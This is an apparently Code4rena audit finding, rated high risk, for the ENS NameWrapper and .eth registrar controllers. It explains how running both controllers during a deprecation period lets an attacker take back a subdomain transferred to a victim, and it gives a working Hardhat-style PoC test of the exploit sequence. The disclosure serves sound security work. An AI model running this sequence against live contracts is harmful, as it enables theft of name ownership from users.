## Tags

- bug
- 3 (High Risk)
- selected for report
- sponsor confirmed
- H-02

# [[ZZ-004] During the deprecation period where both .eth registrar controllers are active, a crafted hack can be launched and cause the same malicious consequences of [ZZ-001] even if [ZZ-001] is properly fixed](https://github.com/code-423n4/2022-11-ens-findings/issues/16) 

+ Severity: High
+ Status: Has not been reported

### Description,

Specifically, according to the [documentation](https://github.com/ensdomains/ens-contracts/tree/master/contracts/wrapper#register-wrapped-names), there will be a deprecation period that two types of .eth registrar controllers are active.

> Names can be registered as normal using the current .eth registrar controller. However, the new .eth registrar controller will be a controller on the NameWrapper, and have NameWrapper will be a controller on the .eth base registrar.

> Both .eth registrar controllers will be active during a deprecation period, giving time for front-end clients to switch their code to point at the new and improved .eth registrar controller.

The current .eth registrar controller can directly register ETH2LD and send to the user, while the new one will automatically wrap the registered ETH2LD.

If the two .eth registrar controllers are both active, an ETH2LD node can be __implicitly__ unwrapped while the NameWrapper owner remains to be the hacker.

__Note that this hack can easily bypass the patch of [ZZ-001].__

Considering the following situtation.

+ the hacker registered and wrapped an ETH2LD node `sub1.eth`, with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` burnt. The ETH2LD will be expired shortly and can be re-registred within the aformentioned deprecation period.

+ after `sub1.eth` is expired, the hacker uses the current .eth registrar controller to register `sub1.eth` to himself.
    - _at this step, the `sub1.eth` is implicitly unwrapped_.
    - the hacker owns the registrar ERC721 as well as the one of ENS registry for `sub1.eth`.
    - however, `sub1.eth` in NameWrapper remains valid.
    
+ he sets `EnsRegistry.owner` of `sub1.eth` as NameWrapper. 
    - note that __this is to bypass the proposed patch for [ZZ-001].__
    
+ he wraps `sub2.sub1.eth` with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` and trafers it to a victim user.

+ he uses `BaseRegistrar::reclaim` to become the `EnsRegistry.owner` of `sub1.eth`
    - at this step, the hack can be launched as __[ZZ-001]__ does.
 
For example, 

+ he can first invokes `EnsRegistry::setSubnodeOwner` to become the owner of `sub2.sub1.eth`

+ he then invokes `NameWrapper::wrap` to wrap `sub2.sub1.eth` to re-claim as the owner.

__Note that it does not mean the impact of the above hack is limited in the deprecation period__. 

What the hacker needs to do is to re-registers `sub1.eth` via the old .eth registrar controller (in the deprecation period). He can then launch the attack any time he wants.

### PoC

```js
    it('Attack happens within the deprecation period where both .eth registrar controllers are active', async () => {
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        1 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )

      // wait the ETH2LD expired and re-register to the hacker himself
      await evm.advanceTime(GRACE_PERIOD + 1 * DAY + 1)
      await evm.mine()

      // XXX: note that at this step, the hackler should use the current .eth
      // registrar to directly register `sub1.eth` to himself, without wrapping
      // the name.
      await BaseRegistrar.register(labelHash1, hacker, 10 * DAY)
      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)

      // set `EnsRegistry.owner` as NameWrapper. Note that this step is used to
      // bypass the newly-introduced checks for [ZZ-001]
      //
      // XXX: corrently, `sub1.eth` becomes a normal node
      await EnsRegistryH.setOwner(wrappedTokenId1, NameWrapper.address)

      // create `sub2.sub1.eth` to the victim user with `PARENT_CANNOT_CONTROL`
      // burnt.
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId1,
        label2,
        account2,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(account2)

      // XXX: reclaim the `EnsRegistry.owner` of `sub1.eth` as the hacker
      await BaseRegistrarH.reclaim(labelHash1, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)

      // reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)

      // wrap `sub2.sub1.eth` to re-claim as the owner
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)
    })
```

### Patch

May need to discuss with ENS team. A naive patch is to check whther a given ETH2LD node is indeed wrapped every time we operate it. However, it is not gas-friendly.